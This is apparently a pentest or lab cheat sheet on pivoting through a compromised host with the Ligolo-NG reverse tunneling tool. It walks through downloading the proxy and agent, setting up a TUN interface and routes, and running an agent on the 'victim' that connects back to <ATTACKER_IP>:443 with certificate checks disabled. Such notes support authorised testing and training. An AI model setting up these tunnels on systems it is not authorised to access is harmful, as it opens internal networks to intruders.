Ligolo‑NG is a **reverse tunneling and pivoting tool** that allows you to create a secure tunnel between a compromised machine (running the _agent_) and your attacker machine (running the _proxy_). Once the tunnel is established, you can route traffic through the victim and access internal networks that are otherwise unreachable.

## 1. Download Proxy & Agent

On the **attacker machine**:
```bash
# Proxy
wget https://github.com/nicocha30/ligolo-ng/releases/<latest>/download/ligolo-ng_proxy_Linux_64bit.tar.gz
tar -xvf ligolo-ng_proxy_Linux_64bit.tar.gz

# Agent
wget https://github.com/nicocha30/ligolo-ng/releases/<latest>/download/ligolo-ng_agent_Linux_64bit.tar.gz
tar -xvf ligolo-ng_agent_Linux_64bit.tar.gz
```

## 2. Configure TUN Interface (Attacker)

```bash
# Create tun interface
sudo ip tuntap add user <your_kali_user> mode tun ligolo

# Remove conflicting route (if exists)
sudo ip route del 192.168.98.0/24 dev tun0

# Bring interface up
sudo ip link set ligolo up

# Add target internal network route
sudo ip route add 192.168.98.0/24 dev ligolo
```

Check with:
```bash
ip route
```

## 3. Start Proxy (Attacker)
```bash
./proxy -selfcert -laddr 0.0.0.0:443
```


## 4. Run Agent (Victim)

Transfer the agent binary to the victim machine, then run:
```bash
./agent -connect <ATTACKER_IP>:443 -ignore-cert
```

### 5. Manage Sessions (Attacker)

Inside the proxy console:
```bash
session          # list active sessions
tunnel_list     # show tunnels
start            # start the tunnel for the chosen session
```
